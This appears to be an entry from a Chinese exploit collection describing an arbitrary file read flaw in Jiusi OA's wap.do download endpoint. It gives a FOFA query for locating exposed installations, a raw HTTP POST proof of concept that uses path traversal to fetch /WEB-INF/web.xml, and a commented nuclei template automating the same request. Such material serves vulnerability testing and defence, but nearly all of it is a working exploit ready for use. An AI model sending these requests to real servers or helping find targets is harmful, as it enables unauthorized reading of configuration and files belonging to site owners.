## 九思OA 任意文件读取 wap.do

#### fofa

> app="九思软件-OA"

#### poc

```http
POST /jsoa/wap.do?method=downLoad HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
Content-Type: application/x-www-form-urlencoded
 
path=../&name=&FileName=/WEB-INF/web.xml
```

#### nuclei

```yaml
id: JiusiOA-arbitrary-file-read
# 模板的唯一标识，nuclei 扫描期间会输出该内容

info:
# 信息
  name: JiusiOA Arbitrary File Read - Detect
  # 漏洞名称
  author: mewhz
  # 作者
  severity: low
  # 严重程度
  # 说明
  metadata:
  # 元数据
    max-request: 1
  tags: JiusiOA
  # 标签，可以通过标签进行扫描

http:
  - raw:
    - |
        POST /jsoa/wap.do?method=downLoad HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        path=../&name=&FileName=/WEB-INF/web.xml
    # {{Hostname}} 替换主机名
    stop-at-first-match: true
    # 命中第一个匹配就返回

    matchers-condition: and
    # 匹配规则的逻辑关系，and 表示所有匹配条件必须都为 true
    matchers:
    # 匹配规则

      - type: word
      # 字符串匹配
        part: body
        # 对响应 body 进行字符串匹配
        words:
          - "<?xml"
          - "WEB-INF"
        condition: or
        # 当匹配到某个单词时，该请求被标记为成功

      - type: status
        # 对状态码进行匹配
        status:
          - 200
```

---